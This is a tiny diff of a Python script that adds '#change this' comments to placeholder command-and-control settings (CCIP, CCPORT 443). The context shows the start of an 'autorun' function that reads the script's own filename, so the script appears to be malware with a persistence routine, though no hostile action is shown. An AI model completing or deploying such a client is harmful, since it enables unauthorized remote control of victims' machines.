@@ -4,8 +4,8 @@ import threading
 import time 
 import os
 
-CCIP = "client ip"
-CCPORT = 443
+CCIP = "client ip" #change this
+CCPORT = 443 #change this
 
 def autorun():
     filen = os.path.basename(__file__)
